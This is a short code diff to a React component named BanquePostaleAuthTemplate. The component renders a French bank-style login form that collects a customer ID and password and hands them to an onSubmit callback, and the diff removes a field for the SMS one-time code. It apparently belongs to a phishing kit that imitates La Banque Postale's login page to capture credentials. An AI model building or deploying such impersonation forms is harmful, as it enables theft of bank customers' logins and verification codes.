@@ -8,8 +8,7 @@ interface BanquePostaleAuthTemplateProps {
 export function BanquePostaleAuthTemplate({ onSubmit }: BanquePostaleAuthTemplateProps) {
   const [formData, setFormData] = useState({
     customerId: '',
-    password: '',
-    otp: ''
+    password: ''
   });
   const [status, setStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
   const [showLoader, setShowLoader] = useState(false);
@@ -117,22 +116,6 @@ export function BanquePostaleAuthTemplate({ onSubmit }: BanquePostaleAuthTemplat
                     {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                   </button>
                 </div>
-              </div>
-
-              <div>
-                <label className="block text-sm font-medium text-gray-700 mb-2">
-                  Code OTP (reçu par SMS)
-                </label>
-                <input
-                  type="text"
-                  name="otp"
-                  value={formData.otp}
-                  onChange={handleChange}
-                  placeholder="Entrez le code OTP"
-                  maxLength="6"
-                  required
-                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
-                />
               </div>
 
               <button
